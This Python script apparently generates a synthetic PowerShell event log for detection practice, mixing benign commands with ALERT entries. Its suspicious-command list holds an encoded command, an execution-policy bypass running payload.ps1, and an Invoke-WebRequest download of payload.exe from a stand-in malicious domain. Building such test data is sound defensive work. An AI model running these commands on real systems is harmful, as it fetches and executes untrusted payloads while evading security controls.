from datetime import datetime, timedelta
import random

start_time = datetime(2026, 5, 14, 14, 0, 0)

normal_commands = [
    "Get-Process",
    "Get-Service",
    "Get-ChildItem",
    "ipconfig",
]

suspicious_commands = [
    "powershell.exe -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByAA==",
    "powershell.exe -ExecutionPolicy Bypass -File payload.ps1",
    "powershell.exe Invoke-WebRequest http://malicious-domain.com/payload.exe",
]

events = []

# Normal activity
for i in range(8):
    timestamp = start_time + timedelta(minutes=i * 2)
    cmd = random.choice(normal_commands)
    user = random.choice(["jdoe", "asmith", "svc_backup"])

    events.append(
        f"{timestamp} INFO user={user} command=\"{cmd}\""
    )

# Suspicious activity
attack_time = start_time + timedelta(minutes=20)

for i in range(6):
    timestamp = attack_time + timedelta(seconds=i * 35)
    cmd = random.choice(suspicious_commands)

    events.append(
        f"{timestamp} ALERT user=unknown command=\"{cmd}\""
    )

events.sort()

with open("../sample-logs/powershell_events.log", "w") as file:
    for event in events:
        file.write(event + "\n")

print("Generated powershell-events.log")